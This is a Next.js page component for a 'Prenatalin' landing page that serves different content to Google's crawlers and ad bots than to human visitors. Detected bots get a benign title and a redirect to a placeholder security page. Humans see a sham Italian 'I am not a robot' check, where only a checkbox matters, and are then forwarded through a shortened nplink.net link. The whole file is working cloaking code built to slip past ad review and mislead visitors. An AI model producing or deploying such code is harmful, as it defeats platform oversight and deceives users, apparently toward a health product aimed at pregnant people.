"use client";

import { useState, useEffect } from 'react';
import Link from 'next/link';
import MetaHead from '@/app/components/metaHead/page';

const config = {
  robot: {
    title: "Prenatal Care",
    redirectUrl: "https://www.example.com/security-page",
    description: "Prenatal Care"
  },
  user: {
    title: "Prenatalin",
    redirectUrl: "https://nplink.net/6r65engj",
    description: "Prenatal Care"
  }
};

const imageUrls = ['/3.png', '/7.png', '/1.png'];

const backgrounds = {
  iPhone11ProBg: "iPhone11Pro:bg-[url('/natalin/iPhone11Pro.png')]",
  iPhone12ProMaxBg: "iPhone12ProMax:bg-[url('/natalin/iPhone12ProMax.png')]",
  iPhone13miniBg: "iPhone13mini:bg-[url('/natalin/iPhone13mini.png')]",
  iPhone13ProBg: "iPhone13Pro:bg-[url('/natalin/iPhone13Pro.png')]",
  iPhone15ProBg: "iPhone15Pro:bg-[url('/natalin/iPhone15Pro.png')]",
  iPhone15ProMaxBg: "iPhone15ProMax:bg-[url('/natalin/iPhone15ProMax.png')]",
  iPadminiBg: "iPadmini:bg-[url('/natalin/iPadmini.png')]",
  iPadBg: "iPad:bg-[url('/natalin/iPad.png')]",
  iPadPro11Bg: "iPadPro11:bg-[url('/natalin/iPadPro11.png')]",
  iPadAir5Bg: "iPadAir5:bg-[url('/natalin/iPadAir5.png')]",
  MacbookAirM2Bg: "MacbookAirM2:bg-[url('/natalin/MacbookAirM2.png')]",
  MacbookPro16Bg: "MacbookPro16:bg-[url('/natalin/MacbookPro16.png')]",
  iMac24Bg: "iMac24:bg-[url('/natalin/iMac24.png')]",
  MacbookAirBg: "MacbookAir:bg-[url('/natalin/MacbookAir.png')]",
  LaptopBg: "Laptop:bg-[url('/natalin/Laptop.png')]",
  Desktop1Bg: "Desktop1:bg-[url('/natalin/Desktop1.png')]",
  Desktop2Bg: "Desktop2:bg-[url('/natalin/Desktop2.png')]",
};

export default function PreNatalin() {
  const [selectedItems, setSelectedItems] = useState([]);
  const [isChecked, setIsChecked] = useState(false);
  const [isRed, setIsRed] = useState(null);

  useEffect(() => {
    const userAgent = navigator.userAgent.toLowerCase();
    const isGoogleRed = userAgent.includes('googlebot') || 
                        userAgent.includes('adsbot-google') || 
                        userAgent.includes('mediapartners-google');
    setIsRed(isGoogleRed);

    document.title = isGoogleRed ? config.robot.title : config.user.title;
  }, []);

  const handleItemSelect = (index) => {
    setSelectedItems((prev) =>
      prev.includes(index) ? prev.filter((i) => i !== index) : [...prev, index]
    );
  };

  const handleButtonClick = (e) => {
    if (!isChecked) {
      e.preventDefault();
      if (typeof window !== 'undefined') {
        window.alert("Si prega di selezionare la casella per verificare che non sei un robot.");
      }
    }
  };

  const getRedirectUrl = () => {
    return isRed ? config.robot.redirectUrl : config.user.redirectUrl;
  };

  if (isRed === null) {
    return (
      <div className="flex justify-center items-center h-screen bg-gray-100">
        <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  return (
    <>
      <MetaHead
        favicon="/favicon.ico"
        title={isRed ? config.robot.title : config.user.title}
        description={isRed ? config.robot.description : config.user.description}
      />

      <main className={`${Object.values(backgrounds).join(' ')} bg-cover h-screen flex justify-center items-center relative`}>
        <div className="absolute inset-0 bg-black opacity-70 z-10"></div>

        <section className="relative z-20 bg-white shadow-md rounded-lg mx-6 p-6 w-full max-w-lg">
          <h2 className="text-center text-2xl font-semibold mb-4 text-gray-800">Verifica di Sicurezza</h2>
          <p className="text-gray-700 mb-4">Seleziona il numero 7</p>

          <div className="grid grid-cols-3 gap-2 mb-4">
            {imageUrls.map((url, index) => (
              <div
                key={index}
                onClick={() => handleItemSelect(index)}
                className={`cursor-pointer p-4 border-4 ${
                  selectedItems.includes(index) ? 'border-blue-600' : 'border-gray-300'
                } rounded-md`}
              >
                <img src={url} alt={`Option ${index + 1}`} className="w-full h-full object-contain" />
              </div>
            ))}
          </div>

          <div className="flex items-center mb-4">
            <input
              type="checkbox"
              id="verify"
              checked={isChecked}
              onChange={() => setIsChecked(!isChecked)}
              className="h-4 w-4 text-blue-600"
            />
            <label htmlFor="verify" className="ml-2 text-gray-700">
              Non sono un robot
            </label>
          </div>

          <Link href={getRedirectUrl()} passHref>
            <button
              onClick={handleButtonClick}
              className="w-full bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 transition-all"
            >
              Invia
            </button>
          </Link>
        </section>
      </main>
    </>
  );
}
